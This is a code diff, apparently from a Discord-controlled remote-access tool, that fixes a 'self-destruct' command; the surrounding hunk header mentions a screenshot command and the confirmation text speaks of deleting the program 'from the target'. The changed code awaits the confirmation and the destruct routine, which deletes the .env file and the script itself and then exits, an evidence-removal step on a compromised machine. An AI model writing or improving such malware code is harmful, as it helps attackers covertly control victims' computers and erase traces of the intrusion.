@@ -277,16 +277,17 @@ async def screenshot(ctx):
 async def destruct():
     os.remove(".env")
     os.remove(__file__)
+    exit()
 
 @bot.command(name="self-destruct")
 async def destruct_command(ctx):
-    confirm = confirm_action(ctx, action_description="**Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
+    confirm = await confirm_action(ctx, action_description="Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
 
     if confirm:
         embed = embed_data(title="Self-destruct", description="Self-destruction started", color=discord.Color.red())
         await ctx.send(embed=embed)
 
-        destruct()
+        await destruct()
     else:
         embed = embed_data(title="Self-destruct", description="Self destruction was cancelled")
         await ctx.send(embed=embed)
